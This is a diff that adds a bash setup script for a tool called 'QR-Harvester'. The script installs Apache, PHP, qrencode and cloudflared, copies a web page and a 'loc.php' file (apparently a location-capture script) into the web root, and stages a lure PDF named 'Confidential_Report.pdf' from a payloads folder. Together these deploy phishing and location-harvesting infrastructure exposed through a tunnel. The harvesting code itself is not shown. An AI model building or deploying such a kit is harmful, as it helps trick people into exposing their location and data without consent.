@@ -1,2 +1,35 @@
 sudo chown -R www-data:www-data /var/www/html/
 sudo chmod -R 755 /var/www/html/
+
+
+
+
+#!/bin/bash
+
+echo "[*] Starting QR-Harvester Setup..."
+
+# Install dependencies
+sudo apt update
+sudo apt install apache2 php php-curl qrencode cloudflared -y
+
+# Set permissions
+sudo chown -R www-data:www-data /var/www/html/
+sudo chmod -R 755 /var/www/html/
+
+# Copy web files
+sudo cp web/index.html /var/www/html/
+sudo cp web/loc.php /var/www/html/
+
+# Copy PDF payload if it exists
+if [ -f "payloads/Confidential_Report.pdf" ]; then
+    sudo cp payloads/Confidential_Report.pdf /var/www/html/
+    sudo chown www-data:www-data /var/www/html/Confidential_Report.pdf
+    echo "[*] PDF copied successfully."
+else
+    echo "[!] Warning: payloads/Confidential_Report.pdf not found."
+fi
+
+# Restart Apache
+sudo systemctl restart apache2
+
+echo "[+] Setup complete. Ensure Cloudflared is running."
